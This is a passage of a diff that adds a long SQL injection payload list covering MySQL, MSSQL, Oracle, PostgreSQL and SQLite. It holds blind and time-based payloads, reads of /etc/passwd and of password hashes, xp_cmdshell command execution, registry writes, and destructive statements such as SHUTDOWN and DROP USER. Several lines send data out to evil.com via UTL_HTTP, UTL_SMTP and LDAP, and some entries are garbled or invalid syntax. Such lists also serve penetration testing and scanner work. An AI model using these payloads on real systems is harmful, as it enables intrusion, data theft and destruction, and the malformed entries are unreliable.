+' ; SELECT UTL_SMTP.OPEN_CONNECTION(''smtp.evil.com'',25) FROM DUAL;--                        -- Oracle
+' ; SELECT UTL_SMTP.HELO(''evil'') FROM DUAL;--                                             -- Oracle
+' ; SELECT UTL_SMTP.MAIL(''from@evil.com'') FROM DUAL;--                                      -- Oracle
+' ; SELECT UTL_SMTP.DATA(''hacked!'') FROM DUAL;--                                           -- Oracle
+
+-- ========================
+-- ⓴ Nested / Chained Subqueries
+-- ========================
+' AND 1=(SELECT 1 FROM (SELECT 1 FROM (SELECT COUNT(*) FROM users) t) x)-- 
+' AND 1=(SELECT 1 FROM (SELECT 1 FROM (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) z) y)-- 
+' AND 1=(SELECT CASE WHEN (SELECT COUNT(*) FROM all_users)>0 THEN 1 ELSE 0 END FROM dual)--  -- Oracle
+' AND 1=(SELECT CASE WHEN (SELECT COUNT(*) FROM pg_roles)>0 THEN 1 ELSE 0 END)--              -- PostgreSQL
+' OR 1=(SELECT CASE WHEN (SELECT COUNT(*) FROM mysql.user)>0 THEN 1 ELSE 0 END)--             -- MySQL
+' OR EXISTS(SELECT * FROM (SELECT * FROM users WHERE username='admin') t)-- 
+' OR EXISTS(SELECT * FROM (SELECT * FROM mysql.user WHERE user='root') t)-- 
+' OR EXISTS(SELECT * FROM (SELECT * FROM information_schema.schemata WHERE schema_name=database()) t)-- 
+' OR EXISTS(SELECT * FROM (SELECT * FROM pg_tables WHERE schemaname='public') t)-- 
+' OR EXISTS(SELECT * FROM (SELECT * FROM all_users) t)--                                     -- Oracle
+' OR EXISTS(SELECT * FROM (SELECT * FROM user_tables) t)--                                    -- Oracle
+' OR EXISTS(SELECT * FROM (SELECT * FROM dba_users) t)--                                      -- Oracle
+' OR EXISTS(SELECT * FROM (SELECT * FROM pg_shadow) t)--                                      -- PostgreSQL
+' OR EXISTS(SELECT * FROM (SELECT * FROM sqlite_master WHERE type='table') t)--               -- SQLite
+
+-- ========================
+-- ⓮ Conditional Comments / DBMS Fingerprinting
+-- ========================
+SELECT CASE WHEN (SUBSTRING(@@version,1,1)='5') THEN SLEEP(5) ELSE SLEEP(0) END--               -- MySQL fingerprint 5.x
+SELECT CASE WHEN (SUBSTRING(@@version,1,1)='8') THEN SLEEP(5) ELSE SLEEP(0) END--               -- MySQL fingerprint 8.x
+SELECT CASE WHEN (charindex('Microsoft SQL Server',@@version)>0) THEN WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0' END-- -- MSSQL
+SELECT CASE WHEN (version() LIKE 'PostgreSQL 12%') THEN pg_sleep(5) ELSE pg_sleep(0) END--       -- PostgreSQL 12 fingerprint
+SELECT CASE WHEN ((SELECT banner FROM v$version WHERE ROWNUM=1) LIKE '%Oracle%') THEN dbms_lock.sleep(5) ELSE dbms_lock.sleep(0) END-- -- Oracle
+' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT database()),1,1))>77) THEN SLEEP(5) ELSE SLEEP(0) END)-- -- MySQL conditional time
+
+-- ========================
+-- ⓱ Miscellaneous / Random Payloads
+-- ========================
+' OR 1=UTL_MATCH.JARO_WINKLER_SIMILARITY('test','test')--                                    -- Oracle
+' OR 1=REGEXP_LIKE((SELECT banner FROM v$version WHERE ROWNUM=1),'Oracle')--                   -- Oracle regex
+' OR 1=regexp_match((SELECT version()),'9\.6')--                                               -- PostgreSQL regex
+' OR 1=(SELECT JSONB_ARRAY_LENGTH(to_jsonb((SELECT * FROM users LIMIT 1))) )--                  -- PostgreSQL jsonb
+' OR 1=(SELECT COUNT(*) FROM json_each((SELECT config FROM settings WHERE id=1)))--             -- SQLite json_each
+' OR (SELECT WMI('Win32_OperatingSystem')) IS NOT NULL--                                        -- MSSQL via linked server
+' OR (SELECT sp_executesql N'SELECT @@version') IS NOT NULL--                                   -- MSSQL
+' OR (SELECT LENGTH((SELECT banner FROM v$version WHERE ROWNUM=1)))%2=0--                        -- Oracle modulo
+' OR (SELECT ASCII(SUBSTRING((SELECT password FROM mysql.user WHERE user='root' LIMIT 1),2,1))) > 97-- -- MySQL
+' OR (SELECT COUNT(*) FROM all_views WHERE view_name='USERS')>0--                                 -- Oracle
+' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.VIEWS WHERE table_name='users')>0--                 -- MySQL
+' OR (SELECT COUNT(*) FROM dba_ind_columns WHERE column_name='PASSWORD')>0--                      -- Oracle
+' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA WHERE schema_name='test')>0--              -- MySQL/PostgreSQL
+' OR (SELECT COUNT(*) FROM SYS.DATABASES WHERE name='master')>0--                                 -- MSSQL
+' OR (SELECT COUNT(*) FROM PG_CATALOG.PG_DATABASE WHERE DATNAME='postgres')>0--                   -- PostgreSQL
+' OR (SELECT object_id('dbo.users')) IS NOT NULL--                                                -- MSSQL
+' OR (SELECT object_id('public.users')) IS NOT NULL--                                             -- PostgreSQL
+' OR (SELECT to_regclass(''public.users'')) IS NOT NULL--                                         -- PostgreSQL
+' OR (SELECT version() REGEXP '.*5\..*')--                                                         -- MySQL regex boolean
+
+-- ========================
+-- ⓲ Data Exfiltration via DNS / HTTP
+-- ========================
+' OR (SELECT LOAD_FILE(CONCAT('/tmp/',(SELECT CONCAT((SELECT database()),'.txt')))) )--                -- local file dump
+' OR (SELECT DUMPFILE(CONCAT('/var/www/html/',(SELECT database()),'.log')) )--                        -- local file dump
+' OR (SELECT SUBSTRING((SELECT LOAD_FILE('/etc/passwd')),1,50))--                                       -- direct read
+' OR (SELECT sys.fn_varbintohexstr(hashbytes(''MD5'',CAST((SELECT @@version) AS VARCHAR))))--          -- MSSQL hex dump
+' OR UTL_HTTP.REQUEST(''http://evil.com/?v=''||(SELECT banner FROM v$version WHERE ROWNUM=1))='x'--    -- Oracle HTTP
+' OR (SELECT pg_read_file('/etc/passwd',0,100))--                                                       -- PostgreSQL partial
+' OR (SELECT inet_server_addr())='127.0.0.1'--                                                          -- PostgreSQL network
+' OR (SELECT DUMP(''||(SELECT version()||'')) )--                                                         -- PostgreSQL hyper
+' OR (SELECT REGEXP_SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),'[0-9]+\.[0-9]+'))='12.1'--      -- Oracle regex extract
+' OR (SELECT count(*) FROM all_procedures WHERE object_name='DBMS_OUTPUT')>0--                            -- Oracle detection
+' OR (SELECT table_name FROM information_schema.tables WHERE table_name LIKE 'flag%')='flag_text'--       -- MySQL
+' OR (SELECT osuser FROM v$session WHERE audsid=userenv(''sessionid'')) LIKE 'SYS'--                     -- Oracle
+
+-- ========================
+-- ⓳ Regexp / Like / Soundex / Full-Text Payloads
+-- ========================
+' AND USER() REGEXP 'root'-- 
+' AND VERSION() RLIKE '[5-8]\.[0-9]+'-- 
+' AND (SELECT password FROM mysql.user WHERE user=USER()) RLIKE '^a.*'-- 
+' AND (SELECT host FROM mysql.user WHERE user='root') LIKE '%localhost%'-- 
+' AND (SELECT banner FROM v$version WHERE ROWNUM=1) LIKE '%12c%'--                                  -- Oracle
+' AND (SELECT datname FROM pg_database WHERE datname LIKE '%postg%') IS NOT NULL--                  -- PostgreSQL
+' AND (SELECT COUNT(*) FROM pg_stat_activity WHERE usename LIKE 'postg%')>0--                       -- PostgreSQL
+' AND SOUNDEX(user())=SOUNDEX('root')--                                                            -- MySQL soundex
+' AND SOUNDEX((SELECT user()))=SOUNDEX('postgres')--                                               -- PostgreSQL soundex
+' AND MATCH(username,password) AGAINST ('admin')--                                                 -- MySQL full-text
+' AND TO_TSVECTOR(username||' '||password) @@ TO_TSQUERY('admin')--                                -- PostgreSQL full-text
+' AND CONTAINS((SELECT banner FROM v$version WHERE ROWNUM=1),'Oracle')>0--                         -- Oracle text
+' AND CONTAINS((SELECT table_name FROM user_tables WHERE ROWNUM=1),'USERS')>0--                     -- Oracle text
+
+-- ========================
+-- ⓴ Logical Conditions & Subqueries
+-- ========================
+' AND 1 BETWEEN 1 AND 2-- 
+' AND 1 NOT BETWEEN 2 AND 3-- 
+' AND 1 IN (SELECT user_id FROM users)-- 
+' AND 2 NOT IN (SELECT user_id FROM users)-- 
+' OR 1 NOT IN (1,2,3)-- 
+' AND 1 < (SELECT COUNT(*) FROM users)-- 
+' AND 1 > (SELECT COUNT(*) FROM users)-- 
+' AND (SELECT COUNT(*) FROM users) >= 1-- 
+' OR (SELECT COUNT(*) FROM users) <= 100-- 
+' AND (SELECT COUNT(*) FROM users) BETWEEN 1 AND 10-- 
+' OR EXISTS(SELECT 1 FROM users WHERE username LIKE '%admin%')-- 
+' AND NOT EXISTS(SELECT 1 FROM users WHERE username='nonexist')-- 
+' AND ALL(SELECT user_id FROM users) > 0-- 
+' AND ANY(SELECT user_id FROM users) = 1-- 
+' AND SOME(SELECT user_id FROM users) = 1-- 
+' AND (SELECT json_extract(config,'$.admin'))='true'--                                                    -- mysql json
+' AND (SELECT config->>'admin' FROM settings WHERE id=1)='true'--                                         -- postgresql jsonb
+' AND (SELECT COUNT(*) FROM settings WHERE config @> '{"admin":true}')>0--                                -- postgresql jsonb
+' AND (SELECT JSON_VALUE((SELECT config FROM settings WHERE id=1), '$.admin'))='true'--                    -- SQL Server json
+' AND (SELECT JSON_QUERY((SELECT config FROM settings WHERE id=1), '$.permissions')) IS NOT NULL--         -- SQL Server
+' AND JSON_EXTRACT((SELECT payload FROM logs WHERE id=1), '$.token') LIKE '%.%'--                            -- MySQL json
+' AND (SELECT JSONB_EXTRACT_PATH_TEXT(payload,'token') FROM logs WHERE id=1) LIKE '%.%'--                    -- PostgreSQL jsonb
+
+-- ========================
+-- ㉑ XPath / XML Exploits
+-- ========================
+' AND XMLExists('//user[name="admin"]' PASSING xmltype((SELECT data FROM xml_table LIMIT 1)))-- 
+' AND XMLExists('//config/secret/text()' PASSING xmltype((SELECT xml_data FROM settings WHERE id=1)))-- 
+' AND EXTRACTVALUE((SELECT xml_data FROM xml_table WHERE id=1),'//user/text()') LIKE '%admin%'--         -- MySQL xml
+' AND UPDATEXML(NULL,concat('/user[1]/name', (SELECT username FROM users LIMIT 1)), NULL)--              -- MySQL xml update
+' AND (SELECT extract('//user/password/text()',xmltype((SELECT xml_data FROM xml_table WHERE id=1))).getstringval()) LIKE '%pass%'-- -- Oracle xml
+' AND (SELECT xmlcast(xmlquery('//config/secret/text()' passing xmltype((SELECT xml_data FROM settings WHERE id=1))) AS varchar2(100))) LIKE '%key%'-- -- Oracle xml
+' AND (SELECT xmltable('//users/user' passing xmltype((SELECT xml_data FROM xml_table))) ) IS NOT NULL-- -- Oracle xmltable
+
+-- ========================
+-- ㉒ File-System / OS Command Injection via SQL
+-- ========================
+' ; EXEC xp_cmdshell 'dir C:\\Windows\\System32'--                                              -- MSSQL
+' ; EXEC xp_cmdshell 'type C:\\Windows\\System32\\drivers\\etc\\hosts'-- 
+' ; EXEC xp_cmdshell 'whoami'-- 
+' ; EXEC xp_cmdshell 'net user'-- 
+' ; EXEC xp_cmdshell 'net localgroup administrators'-- 
+' ; COPY (SELECT lo_get(oid) FROM pg_largeobject WHERE pageno=0) TO '/tmp/pg_lo'--                 -- PostgreSQL
+' ; SELECT utl_file.fopen('/etc', 'passwd', 'r');--                                                   -- Oracle
+' ; SELECT UTL_FILE.GET_LINE(UTL_FILE.FOPEN('/etc','passwd','r'),1) FROM DUAL;--                    -- Oracle (if allowed)
+' ; SELECT * FROM DBMS_LDAP.INIT(''ldap://evil.com'');--                                             -- Oracle ldap
+' ; DECLARE @x INT; EXEC master..xp_dirtree 'C:\\';--                                                -- MSSQL enumeration
+' ; EXEC xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\\Evil','Key';--                                   -- MSSQL registry
+' ; EXEC xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Evil','Test',REG_SZ,'hacked';--                 -- MSSQL registry
+' ; DECLARE @cmd VARCHAR(255); SET @cmd='whoami'; EXEC xp_cmdshell @cmd;--                            -- MSSQL
+' ; SELECT sys.fn_get_audit_file(''C:\\Windows\\System32\\winevt\\Logs\\Security.evtx'', default, default);-- -- MSSQL read event log
+' ; SELECT utl_file.fremove('/tmp','exfil.txt') FROM dual;--                                           -- Oracle
+
+-- ========================
+-- ㉓ JSON/In-Database Scripting Payloads
+-- ========================
+' OR (SELECT JSON_OBJECT_AGG(key,value) FROM settings)--                                            -- MySQL 5.7+
+' OR (SELECT JSON_ARRAY_ELEMENTS_TEXT(config) FROM settings WHERE id=1 LIMIT 1)='true'--             -- PostgreSQL
+' OR (SELECT JSON_EXTRACT(config,'$.admin'))='true'--                                               -- MySQL
+' OR (SELECT config->>'admin' FROM settings WHERE id=1)='true'--                                     -- PostgreSQL
+' OR (SELECT value FROM OPENJSON((SELECT config FROM settings WHERE id=1)) WHERE key='admin')='true'-- -- SQL Server
+' OR JSON_EXISTS((SELECT config FROM settings WHERE id=1), '$.admin')--                             -- Oracle 12c+
+' OR (SELECT APEX_INSTANCE_ADMIN.GET_PARAMETER_VALUE(''ADMIN_USER''))='ADMIN'--                       -- Oracle APEX
+' OR (SELECT SYS.DBMS_DEBUG_VC2COL(a,1) FROM ALL_OBJECTS a WHERE ROWNUM=1)='SYS'--                    -- Oracle debug
+' OR (SELECT COUNT(*) FROM dba_objects WHERE object_name='XMLTYPE')>0--                               -- Oracle
+
+-- ========================
+-- ㉔ Randomized Whitespace/Case Variations
+-- ========================
+' oR    1=1 -- 
+'oR'1'='1'-- 
+" Or 1=1#
+" oR%20(void)(SELECT)(1)=(SELECT)(1) -- 
+' unIoN/**/seLeCt  1,2,3,4 -- 
+' aNd  /*!12345 */ 1=1 -- 
+' Or /*!50000/**/sleep(5) -- 
+'  oR /*!50000/**/sLeEp(7) -- 
+'  Or/*!*/1=/**/1-- 
+'   UnIon SelECT	1,2,3,4-- 
+'  UNIoN/**/SeLeCt	1,@@version,3-- 
+'  Or/**/Exists/**/(SELECT//*//*//*//users)//-- 
+
+-- ========================
+-- ㉕ Payloads for Legacy/Deprecated Syntax
+-- ========================
+' AND 1==1 --                                                 -- some old engines
+' OR 1==1 --                                                  -- legacy
+' OR 'a'=='a' --                                               -- legacy
+' AND (SELECT TOP 1 name FROM sysobjects WHERE xtype='U')='users'--       -- old mssql
+' OR (SELECT ROWNUM FROM dual WHERE ROWNUM=1) =1 --                        -- old oracle
+' OR ^1^=^1^ --                                                       -- weird caret
+' OR '%'='%' --                                                     -- wildcard equal
+' OR '*'='*' --                                                     -- wildcard equal
+' AND 1||1=2 --                                                     -- some sqlite piped OR
+' OR 1&&1=1 --                                                     -- some mysql AND syntax
+' OR 1 AND 1 --                                                     -- legacy mysql
+' OR 1; --                                                          -- semicolon injection
+' AND 1; --                                                         -- semicolon injection
+' OR 1 -- CLASS --                                                  -- weird keyword
+' OR 1 /* ANY TEXT HERE */ --                                     -- inside comment
+' OR 1 # ANY TEXT HERE --                                         -- after hash
+' OR 1 %23 ANY TEXT HERE --                                        -- encoded hash
+
+-- ========================
+-- ㉖ Polyglot Payloads / Multi-DBMS Attempts
+-- ========================
+'; UPDATE sqlite_sequence SET seq=0;--                             -- sqlite
+'; VACUUM;--                                                      -- sqlite
+'; SHUTDOWN;--                                                     -- MySQL
+'; REVOKE ALL PRIVILEGES FROM PUBLIC;--                            -- PostgreSQL
+'; GRANT ALL ON DATABASE postgres TO PUBLIC;--                    -- PostgreSQL
+'; DROP USER evil;--                                               -- PostgreSQL
+'; DROP ROLE evil;--                                               -- PostgreSQL
+'; COMMIT;--                                                       -- Generic
+'; ROLLBACK;--                                                     -- Generic
+'; SET TRANSACTION ISOLATION LEVEL SERIALIZABLE;--                -- Generic
+'; LOCK TABLE users IN EXCLUSIVE MODE;--                           -- PostgreSQL
+'; LOCK TABLE users WRITE;--                                      -- MySQL
+'; FLUSH PRIVILEGES;--                                             -- MySQL
+'; ANALYZE TABLE users;--                                          -- MySQL
+'; OPTIMIZE TABLE users;--                                         -- MySQL
+'; DBCC CHECKDB;--                                                 -- MSSQL
+'; DBCC DROPCLEANBUFFERS;--                                        -- MSSQL
+'; DBCC FREEPROCCACHE;--                                           -- MSSQL
+'; EXEC sp_who;--                                                  -- MSSQL
+'; EXEC sp_helpdb;--                                               -- MSSQL
+'; execillicitprocedure;--                                         -- random
+'; pragma integrity_check;--                                       -- sqlite
+'; pragma integrity_check('main');--                               -- sqlite
+'; PRAGMA user_version;--                                          -- sqlite
+
+-- ========================
+-- ㉗ Evasion Techniques (Comments, Encodings, Obfuscation)
+-- ========================
+' O R 1=1 --                                                    -- space between letters
+'/*!50000OR*/1=1--                                              -- inline comment
+'/**/OR/**/1=1/**/--                                            -- slash-star 
+' OR%09%091=1--                                                   -- tab encoding
+' OR%0A1=1--                                                      -- newline encoding
+' OR%0D1=1--                                                      -- carriage return
+' OR%28SELECT%29=1--                                               -- parenthesis encoded
+' OR%2F*%21*%2F1=1--                                               -- slash-star-url-encoded
+' O%52 1=1--                                                      -- partial ASCII encoded O->0x4F? 
+' O%52 1=0/*whatever*/--                                          -- obfuscation
+' O%52 1=0%20--                                                    -- mixed encoding
+' ' O %20r ' 1 '=' 1 ' --                                        -- weird spacing
+' ' O%20R ' 1 ' = ' 1 ' --                                        -- uppercase/lowercase mix
+' OR(SELECT 1)=1--                                                 -- parentheses
+' O/**/R(/**/SELECT/**/1)=1--                                     -- comment injection
+' /*!12345select*/1,version()--                                    -- numbered comment
+' /*!3251sleep*/(5)--                                             -- numbered comment time-based
+' /*!50000update*/users/*test*/set/*test*/admin=1--                -- obfuscated update
+' /*!50000delete*/from/*test*/logs--                               -- obfuscated delete
+' /*!50000insert*/into/*test*/trace(a)values(1)--                  -- obfuscated insert
+
+-- ========================
+-- ㉘ Final Bulk Random Picks (20 অনিশ্চিত/র‍্যান্ডম)
+-- ========================
+' OR CONVERT(INT,(SELECT LEN(@@version)))>0-- 
+' OR ISNULL((SELECT @@version),0)=0-- 
+' OR 1=TRY_CAST((SELECT version()) AS INT)-- 
+' OR 1=PARSE((SELECT version()) AS INT)-- 
+' OR 1=REGEXP_MATCH((SELECT version()),'[0-9]+')-- 
+' OR 1=TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1))-- 
+' OR 1=TO_DATE('2025-01-01','YYYY-MM-DD')--  
+' OR 1=TO_CHAR((SELECT SYSDATE FROM DUAL), 'DD')-- 
+' OR 1=TO_CHAR((SELECT CURRENT_TIMESTAMP), 'DD')-- 
+' OR 1=DBMS_RANDOM.VALUE(1,10)=5--                                            -- oracle random
+' OR 1=FILTER(sizeof=(SELECT version()),5)=sizeof--                          -- pseudo
+' OR 1=LET(@x=(SELECT COUNT(*) FROM users), @x)=@x--                            -- mssql local var
+' OR 1=!!(SELECT 1 FROM DUAL)--                                                -- oracle boolean cast
+' OR 1=~(SELECT 0 FROM DUAL)--                                                 -- oracle bitwise not
+' OR 1=^ (SELECT 1 FROM DUAL)--                                                -- oracle caret
+' OR 1&1=1--                                                                 -- bitwise and
+' OR 1|0=1--                                                                 -- bitwise or
+' OR 1^1=0--                                                                 -- bitwise xor
+' OR 1<<1=2--                                                                -- bitwise shift
+' OR 1>>1=0--                                                                -- bitwise shift
+' OR 1ˆˆ1=1--                                                                -- caret caret
+' OR 1=abs((SELECT -1))--                                                    -- absolute value
